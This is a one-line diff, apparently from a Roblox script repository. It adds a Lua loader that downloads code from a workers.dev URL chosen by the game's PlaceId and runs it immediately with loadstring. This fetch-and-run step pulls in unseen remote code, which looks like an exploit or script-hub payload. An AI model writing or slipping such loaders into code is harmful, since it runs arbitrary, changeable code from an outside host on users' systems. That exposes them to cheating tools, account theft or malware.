@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://dicehub.phurinthsukhkraphngs.workers.dev/" .. game.PlaceId))()
